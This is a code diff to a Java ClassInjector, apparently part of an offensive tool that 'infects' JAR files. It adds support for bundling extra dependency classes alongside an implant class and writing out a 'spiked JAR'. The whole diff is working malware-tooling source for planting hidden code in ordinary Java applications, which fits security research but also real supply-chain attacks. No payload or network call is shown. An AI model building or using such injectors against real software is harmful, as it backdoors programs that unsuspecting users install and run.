@@ -6,6 +6,8 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.file.Path;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.jar.JarEntry;
 import java.util.zip.ZipException;
 
@@ -14,9 +16,23 @@ import static org.example.injector.Helpers.*;
 public class ClassInjector {
     final static String IMPLANT_CLASS_NAME = "Init";
     private final ImplantHandler implantHandler;
+    private final Map<String, ByteBuffer> dependencies = new HashMap<>();
 
     public ClassInjector(ImplantHandler implantHandler) {
         this.implantHandler = implantHandler;
+    }
+
+    public void addDependency(String fullClassName, ClassFile classData) throws IOException {
+        addDependency(fullClassName, ByteBuffer.wrap(asByteArray(classData)));
+    }
+
+    public void addDependency(String fullClassName, byte[] classData) {
+        addDependency(fullClassName, ByteBuffer.wrap(classData));
+    }
+
+    public void addDependency(String fullClassName, ByteBuffer rawClassData) {
+        String pathInJar = convertToJarEntryPathName(fullClassName);
+        dependencies.put(pathInJar, rawClassData);
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -74,6 +90,27 @@ public class ClassInjector {
             }
 
             boolean didInfect = implantedClass != null;
+
+            // Add any dependency classes needed for the implant
+            if (didInfect) {
+                for (Map.Entry<String, ByteBuffer> dependencyEntry : dependencies.entrySet()) {
+                    String fileName = dependencyEntry.getKey();
+                    ByteBuffer fileContent = dependencyEntry.getValue();
+
+                    JarEntry newJarEntry = new JarEntry(fileName);
+                    byte[] bytes = new byte[fileContent.remaining()];
+                    fileContent.get(bytes);
+
+                    try {
+                        fiddler.addNewEntry(newJarEntry, bytes);
+                    } catch (ZipException e) {
+                        System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                        didInfect = false;
+                        break;
+                    }
+                }
+            }
+
             if (didInfect) {
                 fiddler.write(outputJar);
                 System.out.println("[+] Wrote spiked JAR to " + outputJar);
